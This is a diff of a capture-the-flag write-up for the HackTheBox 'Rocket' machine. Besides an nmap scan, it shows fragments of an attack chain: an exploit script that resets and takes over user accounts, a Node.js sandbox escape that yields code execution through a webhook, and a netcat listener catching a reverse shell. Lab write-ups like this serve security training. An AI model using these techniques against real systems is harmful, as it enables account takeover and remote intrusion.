@@ -1,6 +1,7 @@
 # Rocket
 
 ```
+# nmap -sCV -p- rocket.htb
 Nmap scan report for rocket.htb (10.129.172.140)
 Host is up (0.15s latency).
 Not shown: 65532 closed ports
@@ -34,7 +35,7 @@ def twofactor(url,email):
 ```
 
 ```
-(venv) Mon Jul 26 22:48:48 wil@pwn:~/htb/business_ctf/boxes/rocket$ python3 sploit.py -u emmap@rocket.htb -a ezekiel@rocket.htb -t http://rocket.htb:3000/
+$ python3 sploit.py -u emmap@rocket.htb -a ezekiel@rocket.htb -t http://rocket.htb:3000/
 [+] Resetting emmap@rocket.htb password
 [+] Password Reset Email Sent
 Got: _
@@ -86,10 +87,10 @@ const require = console.log.constructor('return process.mainModule.require')();
 
 ![RCE with the web hook](img/rce_admin.png "RCE with the web hook")
 
-When hitting the Webhook URL the revshell is connecting back to us:
+When hitting the Webhook URL(see screen above) the revshell is connecting back to us:
 
 ```
-Tue Jul 27 00:41:51 wil@pwn:~/htb/business_ctf/boxes$ nc -nvlp 80
+$ nc -nvlp 80
 Listening on [0.0.0.0] (family 2, port 80)
 Connection from 10.129.1.7 50358 received!
 id
